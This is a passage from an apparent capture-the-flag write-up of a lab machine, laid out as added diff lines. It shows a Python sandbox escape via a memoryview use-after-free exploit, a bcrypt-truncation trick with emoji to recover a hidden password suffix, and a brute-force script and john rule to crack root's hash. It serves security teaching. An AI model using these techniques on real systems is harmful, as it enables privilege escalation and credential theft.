+<p><strong>exec</strong>(<em>object</em>, <em>globals=None</em>, <em>locals=None</em>, <em>/</em>, <em>**, *closure=None</em>)</p>
+<p>This function supports dynamic execution of Python code. <em>object</em> must be either a string or a code object.</p>
+</blockquote>
+<p><code class="language-plaintext highlighter-rouge">safe_python</code> is calling <code class="language-plaintext highlighter-rouge">exec(f.read(), env)</code>. <code class="language-plaintext highlighter-rouge">env</code> is being passed in as <code class="language-plaintext highlighter-rouge">globals</code>. Later in the docs it says:</p>
+<blockquote>
+<p>If the <em>globals</em> dictionary does not contain a value for the key <code class="language-plaintext highlighter-rouge">__builtins__</code>, a reference to the dictionary of the built-in module <a href="https://docs.python.org/3/library/builtins.html#module-builtins"><code class="language-plaintext highlighter-rouge">builtins</code></a> is inserted under that key. That way you can control what builtins are available to the executed code by inserting your own <code class="language-plaintext highlighter-rouge">__builtins__</code> dictionary into <em>globals</em> before passing it to <a href="https://docs.python.org/3/library/functions.html#exec"><code class="language-plaintext highlighter-rouge">exec()</code></a>.</p>
+</blockquote>
+<p>So basically this is redefining the <code class="language-plaintext highlighter-rouge">__builtins__</code> dictionary, with the potential of limiting what can be done.</p>
+<h4 id="intended-functionality">Intended Functionality</h4>
+<p>To test <code class="language-plaintext highlighter-rouge">safe_python</code>, I’ll write a simple benign Python script and pass it in:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:/tmp$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"print('0xdf was here')"</span> <span class="o">&gt;</span> <span class="nb">test</span> 
+<span class="gp">jack@rainyday:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> jack_adm safe_python ./test 
+<span class="go">0xdf was here
+</span></code></pre></div></div>
+<p>It works fine. If I try to do something a bit more malicious, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:/tmp$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"import os; os.system("</span><span class="nb">id</span><span class="s2">")"</span> <span class="o">&gt;</span> <span class="nb">test</span> 
+<span class="gp">jack@rainyday:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> jack_adm safe_python ./test 
+<span class="go">Traceback (most recent call last):
+  File "/usr/bin/safe_python", line 29, in &lt;module&gt;
+    exec(f.read(), env)
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+ImportError: __import__ not found
+</span></code></pre></div></div>
+<p>It seems the <code class="language-plaintext highlighter-rouge">__import__</code> function (used by the <code class="language-plaintext highlighter-rouge">import</code> keyword) has been removed. How Python’s import system works is nicely described <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-11-how-the-python-import-system-works/">on Ten Thousand Meters</a>. This must be why <code class="language-plaintext highlighter-rouge">safe_python</code> is “safe”.</p>
+<h3 id="use-after-free-in-python">Use-After-Free in Python</h3>
+<h4 id="background">Background</h4>
+<p>There’s an issue with Python about how the builtin <code class="language-plaintext highlighter-rouge">memoryview</code> <a href="https://docs.python.org/3/library/functions.html#func-memoryview">function</a> has a user-after-free vulenrability in it. This vulnerability was <a href="https://bugs.python.org/issue15994">reported as a crash</a> in 2012, and remained unresolved and migrated to an <a href="https://github.com/python/cpython/issues/60198">issue on the cpython GitHub</a>, where it remains open into 2023.</p>
+<p><a href="https://pwn.win/2022/05/11/python-buffered-reader.html">This blog post</a> goes into how the author was able to exploit this vulenrability to get execution. At the very end of the post, there is a section titled “So what?”:</p>
+<blockquote>
+<p>What’s the point of this whole thing, can’t you just do <code class="language-plaintext highlighter-rouge">os.system(...)</code>? Well, yes.</p>
+<p>Given that you need to be able to execute arbitrary Python code in the first place, this exploit won’t be useful in most settings. However, it may be useful in Python interpreters which are attempting to sandbox your code, through restricting imports or use of <a href="https://peps.python.org/pep-0578/">Audit Hooks</a>, for example. This exploit doesn’t use any imports and doesn’t create any code objects, which will fire <code class="language-plaintext highlighter-rouge">import</code> and <code class="language-plaintext highlighter-rouge">code.__new__</code> hooks, respectively. My exploit will only trigger a <code class="language-plaintext highlighter-rouge">builtin.__id__</code> hook event, which is much more likely to be permitted.</p>
+</blockquote>
+<p>What’s the benefit of this exploit if you can just <code class="language-plaintext highlighter-rouge">os.system(...)</code>? What about in this scenario where I can’t import <code class="language-plaintext highlighter-rouge">os</code>?</p>
+<h4 id="poc">POC</h4>
+<p>I’ll pull the <a href="https://raw.githubusercontent.com/kn32/python-buffered-reader-exploit/master/exploit.py">exploit script</a> from GitHub and save a copy on RainyDay. Just running it results in a shell as the running user, jack:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:/dev/shm$</span><span class="w"> </span>python3 sploit.py 
+<span class="go">[*] .dynamic:   0x564935045be8
+[*] DT_SYMTAB:  0x564934ae45f8
+[*] DT_STRTAB:  0x564934af1300
+[*] DT_RELA:    0x564934b4a560
+[*] DT_PLTGOT:  0x564935045e08
+[*] DT_INIT:    0x564934b4e000
+[*] Found system at rela index 97
+[*] Full RELRO binary, reading system address from GOT
+[*] system:     0x7fc6191bfd60
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000(jack) gid=1000(jack) groups=1000(jack)
+</span></code></pre></div></div>
+<p>But running it with <code class="language-plaintext highlighter-rouge">sudo</code> and <code class="language-plaintext highlighter-rouge">safe_python</code> results in a shell as jack_adm:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack@rainyday:/dev/shm$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> jack_adm safe_python ./sploit.py 
+<span class="go">[*] .dynamic:   0x558397107be8
+[*] DT_SYMTAB:  0x558396ba65f8
+[*] DT_STRTAB:  0x558396bb3300
+[*] DT_RELA:    0x558396c0c560
+[*] DT_PLTGOT:  0x558397107e08
+[*] DT_INIT:    0x558396c10000
+[*] Found system at rela index 97
+[*] Full RELRO binary, reading system address from GOT
+[*] system:     0x7f4d4a4dcd60
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1002(jack_adm) gid=1002(jack_adm) groups=1002(jack_adm)
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>jack_adm can run <code class="language-plaintext highlighter-rouge">hash_password.py</code> as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for jack_adm on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jack_adm may run the following commands on localhost:
+    (root) NOPASSWD: /opt/hash_system/hash_password.py
+</span></code></pre></div></div>
+<p>Just like above, jack_adm can’t access the script to see what it does:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/hash_system/hash_password.py
+<span class="go">ls: cannot access '/opt/hash_system/hash_password.py': Permission denied
+</span><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/hash_system/
+<span class="go">ls: cannot open directory '/opt/hash_system/': Permission denied
+</span><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
+<span class="go">total 8
+drwx--x--x 4 root root 4096 Sep 29 13:47 containerd
+drwxr-x--- 3 root root 4096 Oct 19 10:00 hash_system
+</span></code></pre></div></div>
+<h3 id="hash_passwordpy">hash_password.py</h3>
+<h4 id="typical-usage">Typical Usage</h4>
+<p>Running it prompts for a password, and then prints a bcrypt hash:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash_system/hash_password.py
+<span class="gp">Enter Password&gt;</span><span class="w"> </span>0xdf0xdf
+<span class="gp">[+] Hash: $</span>2b<span class="nv">$05$WE5VLzwKLlJiQM9T0RmwpeM9oTcg7QUJyveu5qTqP8eohInkPuCFG</span>
+</code></pre></div></div>
+<p>If I give it an empty password, or a long on, it complains and reprompts:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash_system/hash_password.py
+<span class="gp">Enter Password&gt;</span><span class="w"> 
+</span><span class="go">[+] Invalid Input Length! Must be &lt;= 30 and &gt;0
+</span><span class="gp">Enter Password&gt;</span><span class="w"> </span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span class="go">[+] Invalid Input Length! Must be &lt;= 30 and &gt;0
+</span><span class="gp">Enter Password&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="hash-analysis">Hash Analysis</h4>
+<p>If I grab the hash produced for “0xdf0xdf” and try to crack it with <code class="language-plaintext highlighter-rouge">john</code>, it doesn’t:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>john 0xdf0xdf.hash <span class="nt">--wordlist</span><span class="o">=</span>&lt;<span class="o">(</span> <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"0xdf0xdf"</span> <span class="o">)</span>
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Warning: Only 1 candidate buffered, minimum 12 needed for performance.
+0g 0:00:00:00 DONE (2023-02-14 21:25) 0g/s 50.00p/s 50.00c/s 50.00C/s 0xdf0xdf
+Session completed. 
+</span></code></pre></div></div>
+<p>If I generate a bcrypt hash (perhaps with a website like <a href="https://bcrypt-generator.com/">this one</a>) and try to crack that the same way, it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>john 0xdf0xdf.hash <span class="nt">--wordlist</span><span class="o">=</span>&lt;<span class="o">(</span> <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"0xdf0xdf"</span> <span class="o">)</span>
+<span class="go">Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+Loaded hashes with cost 1 (iteration count) varying from 32 to 4096
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Warning: Only 1 candidate buffered, minimum 12 needed for performance.
+0xdf0xdf         (?)     
+1g 0:00:00:00 DONE (2023-02-14 21:25) 4.545g/s 4.545p/s 9.090c/s 9.090C/s 0xdf0xdf
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</span></code></pre></div></div>
+<p>Clearly something is being done to make the hash not match what I’m expecting.</p>
+<h3 id="recover-secret">Recover Secret</h3>
+<h4 id="strategy">Strategy</h4>
+<p>At the start of the box I was able to recover bcrypt hashes for jack, root, and gary. I was able to crack gary’s, but not jack or roots. I also got access as jack by forging a cookie. It seems like the root hash could have been created by this script.</p>
+<p>I also know that the output hash doesn’t match standard bcrypt results. The most likely reason for that is that some secret is appended or prepended to the password before it is hashed in the script. If I can figure out what that secret is, I can try again to crack the root password, this time with the appended secret.</p>
+<p>The final bit of necessary information is that bcrypt hashes have a <a href="https://dzone.com/articles/be-aware-that-bcrypt-has-a-maximum-password-length">maximum content length</a>, typically up to <a href="https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length">72 characters</a>.</p>
+<blockquote>
+<p>Passwords that exceed the maximum length will be truncated.</p>
+</blockquote>
+<p>In theory, I could test this if I were able to send matching strings of 72 and 73 characters into the script and see that the results were the same, with the last character of the longer one truncated.</p>
+<p>The solution to this challenge is something I showed on <a href="/hackvent2022/hard#hv2220">day 20 of HackVent 2022</a> - Unicode characters. From that writeup:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span>len<span class="o">(</span><span class="s1">'🎅'</span><span class="o">)</span>
+<span class="go">1
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span>len<span class="o">(</span><span class="s1">'🎅'</span>.encode<span class="o">())</span>
+<span class="go">4
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span>len<span class="o">(</span><span class="s1">'❗'</span>.encode<span class="o">())</span>
+<span class="go">3
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span>len<span class="o">(</span><span class="s1">'§'</span>.encode<span class="o">())</span>
+<span class="go">2
+</span></code></pre></div></div>
+<h4 id="verify-truncation">Verify Truncation</h4>
+<p>If my theory is correct, then sending in 20 santa emoji as the password will pass the check of being less than 30 characters, but then expand to be 80 bytes to be hashed. That will be truncated to 72 bytes. If that’s the case, then <code class="language-plaintext highlighter-rouge">john</code> will crack the resulting hash with 18 santa, not 20.</p>
+<p>I’ll try generating the hash for 20 santas:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash_system/hash_password.py
+<span class="gp">Enter Password&gt;</span><span class="w"> </span>🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+<span class="go">[+] Hash: $2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC
+
+</span></code></pre></div></div>
+<p>I’ve got a text file with 16-22 santas per line:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>santas.txt 
+<span class="go">🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+</span></code></pre></div></div>
+<p>When I pass that to <code class="language-plaintext highlighter-rouge">john</code>, it cracks:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>john santa20.hash <span class="nt">--wordlist</span><span class="o">=</span>santas.txt
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Warning: Only 3 candidates buffered, minimum 12 needed for performance.
+🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅 (?)     
+1g 0:00:00:00 DONE (2023-02-14 22:06) 50.00g/s 150.0p/s 150.0c/s 150.0C/s 🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅..🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</span></code></pre></div></div>
+<p>That password that matched was 18 santas.</p>
+<p>This has proved that anything over 72 bytes is truncated, and that I can bypass the length restrictions (to a point) using unicode.</p>
+<p>I also know that nothing is being added to the front of the string, because if it was, then <code class="language-plaintext highlighter-rouge">john</code> wouldn’t crack that hash with 18 santas.</p>
+<h4 id="switch-to-python">Switch to Python</h4>
+<p>Rather than <code class="language-plaintext highlighter-rouge">john</code>, I’m going to switch to <code class="language-plaintext highlighter-rouge">python</code> for verification, as that will allow me to script this. To make sure I know what’s working, I’ll verify the same hash as above:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">bcrypt</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">((</span><span class="sh">"</span><span class="s">🎅</span><span class="sh">"</span><span class="o">*</span><span class="mi">18</span><span class="p">).</span><span class="nf">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="sh">"</span><span class="s">$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">True
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">((</span><span class="sh">"</span><span class="s">🎅</span><span class="sh">"</span><span class="o">*</span><span class="mi">19</span><span class="p">).</span><span class="nf">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="sh">"</span><span class="s">$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">True
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">((</span><span class="sh">"</span><span class="s">🎅</span><span class="sh">"</span><span class="o">*</span><span class="mi">20</span><span class="p">).</span><span class="nf">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="sh">"</span><span class="s">$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">True
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">((</span><span class="sh">"</span><span class="s">🎅</span><span class="sh">"</span><span class="o">*</span><span class="mi">17</span><span class="p">).</span><span class="nf">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="sh">"</span><span class="s">$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">False
+</span></code></pre></div></div>
+<p>Just like hashing, verification truncates the input at 72 characters, so 18, 19, and 20 santas all return success, but 17 does not.</p>
+<h4 id="verify-secret-append">Verify Secret Append</h4>
+<p>If the script is adding a secret key, it must be to the end of the input password. That means I can send 71 bytes, and then there are only 256 possible options for that last byte (less if I assume it has to be printable so that it can be entered into a web login).</p>
+<p>I’ll generate a hash for a password that’s 71 bytes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:~$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash_system/hash_password.py
+<span class="gp">Enter Password&gt;</span><span class="w"> </span>🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅AAA
+<span class="go">[+] Hash: $2b$05$lO1UZdMYEKrCHU2xY1yXrOw/wJh4BmwUyQE2g6JAQa02yxZwbMQZW
+</span></code></pre></div></div>
+<p>If the first character of the secret is “0”, then this would return true:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">((</span><span class="sh">"</span><span class="s">🎅</span><span class="sh">"</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="sh">"</span><span class="s">AAA</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">).</span><span class="nf">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="sh">"</span><span class="s">$2b$05$lO1UZdMYEKrCHU2xY1yXrOw/wJh4BmwUyQE2g6JAQa02yxZwbMQZW</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">False
+</span></code></pre></div></div>
+<p>I’ll start with the assumption that the secret will be with printable characters, and in fact, it finds an “H”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">string</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nb">hash</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">$2b$05$lO1UZdMYEKrCHU2xY1yXrOw/wJh4BmwUyQE2g6JAQa02yxZwbMQZW</span><span class="sh">"</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span> <span class="k">if</span> <span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">((</span><span class="sh">"</span><span class="s">🎅</span><span class="sh">"</span><span class="o">*</span><span class="mi">17</span> <span class="o">+</span> <span class="sh">"</span><span class="s">AAA</span><span class="sh">"</span> <span class="o">+</span> <span class="n">c</span><span class="p">).</span><span class="nf">encode</span><span class="p">(),</span> <span class="nb">hash</span><span class="p">)]</span>
+<span class="go">['H']
+</span></code></pre></div></div>
+<p>Breaking down that list comprehension a bit, it is creating a list where the entries are the characters (<code class="language-plaintext highlighter-rouge">c</code>) for each item in <code class="language-plaintext highlighter-rouge">string.printable</code> but only if <code class="language-plaintext highlighter-rouge">bcrypt.checkpw(("🎅"*17 + "AAA" + c).encode(), hash)</code>.</p>
+<h4 id="script-full-secret">Script Full Secret</h4>
+<p>I’ll write a short Python script that will brute force the full secret. I’ll need <code class="language-plaintext highlighter-rouge">bcrypt</code>, <code class="language-plaintext highlighter-rouge">string</code>, and <code class="language-plaintext highlighter-rouge">subprocess</code> (to run the hash program):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">bcrypt</span>
+<span class="kn">import</span> <span class="n">string</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+</code></pre></div></div>
+<p>I’ll set the secret to an empty string, and start a <code class="language-plaintext highlighter-rouge">while True</code> loop:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secret</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</code></pre></div></div>
+<p>On each iteration, I’ll start by calculating the password I need to hash to get one more unknown into the hash:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># generate next password
+</span>    <span class="n">pass_len</span> <span class="o">=</span> <span class="mi">71</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
+    <span class="n">num_santa</span> <span class="o">=</span> <span class="n">pass_len</span> <span class="o">//</span> <span class="mi">4</span>
+    <span class="n">num_a</span> <span class="o">=</span> <span class="n">pass_len</span> <span class="o">%</span> <span class="mi">4</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="sh">"</span><span class="s">🎅</span><span class="sh">"</span> <span class="o">*</span> <span class="n">num_santa</span> <span class="o">+</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">num_a</span>
+</code></pre></div></div>
+<p>Now I’ll hash that password and capture the hash:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># get hash
+</span>    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="sh">"</span><span class="s">./cheat/hash_password.py</span><span class="sh">"</span><span class="p">],</span> <span class="nb">input</span><span class="o">=</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">(),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span>
+    <span class="p">)</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)[</span><span class="mi">4</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Next, I’ll loop over potential characters, checking if any satisfy the hash, and if so, break:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># brute last character
+</span>    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\r</span><span class="si">{</span><span class="n">secret</span><span class="si">}{</span><span class="n">c</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">""</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">((</span><span class="n">password</span> <span class="o">+</span> <span class="n">secret</span> <span class="o">+</span> <span class="n">c</span><span class="p">).</span><span class="nf">encode</span><span class="p">(),</span> <span class="nb">hash</span><span class="p">):</span>
+            <span class="n">secret</span> <span class="o">+=</span> <span class="n">c</span>
+            <span class="k">break</span>
+    <span class="c1"># There is no more character - end loop
+</span>    <span class="k">else</span><span class="p">:</span>
+        <span class="k">break</span>
+</code></pre></div></div>
+<p>When the <code class="language-plaintext highlighter-rouge">for</code> loop runs without finding success, I’ll break and assume I’ve found the end of the hash.</p>
+<p>At the end of the program I’ll print <code class="language-plaintext highlighter-rouge">secret</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\r</span><span class="si">{</span><span class="n">secret</span><span class="si">:</span><span class="mi">50</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I’ll save this on RainyDay, and run it. It finds the secret in less than two seconds:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:/dev/shm$</span><span class="w"> </span><span class="nb">time </span>python3 brute.py 
+<span class="go">H34vyR41n                                         
+
+real    0m1.561s
+user    0m1.031s
+sys     0m0.085s
+</span></code></pre></div></div>
+<h3 id="crack-root-hash">Crack root Hash</h3>
+<h4 id="create-rule">Create Rule</h4>
+<p>I’ll create a rules configuration in <code class="language-plaintext highlighter-rouge">john</code> to append “H34vyR41n” to the end of each word in <code class="language-plaintext highlighter-rouge">rockyou.txt</code> and check it’s hash. If I try to run with a not yet defined rule, it tells me that rule isn’t in <code class="language-plaintext highlighter-rouge">/opt/john/run/john.conf</code> (this location will differ depending on how / where you install <code class="language-plaintext highlighter-rouge">john</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>john root.hash <span class="nt">--rules</span><span class="o">=</span>rainyday <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 4 OpenMP threads
+No "rainyday" mode rules found in /opt/john/run/john.conf
+</span></code></pre></div></div>
+<p>I’ll find some of the other parts that start with <code class="language-plaintext highlighter-rouge">[List.Rule:&lt;name&gt;]</code> and add mine in:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># A "no rules" rule for eg. super-fast Single mode (use with --single=none)
+</span><span class="go">[List.Rules:None]
+:
+
+[List.Rules:rainyday]
+Az"H34vyR41n"
+
+</span><span class="c"># A "drop all" rule for even faster Single mode (debugging :)
+</span><span class="go">[List.Rules:Drop]
+&lt;1'0
+</span></code></pre></div></div>
+<p><a href="https://miloserdov.org/?p=5477">This post</a> goes into how to append a string as a rule:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230214202748582.webp" type="image/webp"/>
+<img alt="image-20230214202748582" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230214202748582.png"/>
+</picture>
+<p>Since <code class="language-plaintext highlighter-rouge">N</code> is the position, it says to use <code class="language-plaintext highlighter-rouge">z</code> to append to the end. I’ll save and exit <code class="language-plaintext highlighter-rouge">john.conf</code>.</p>
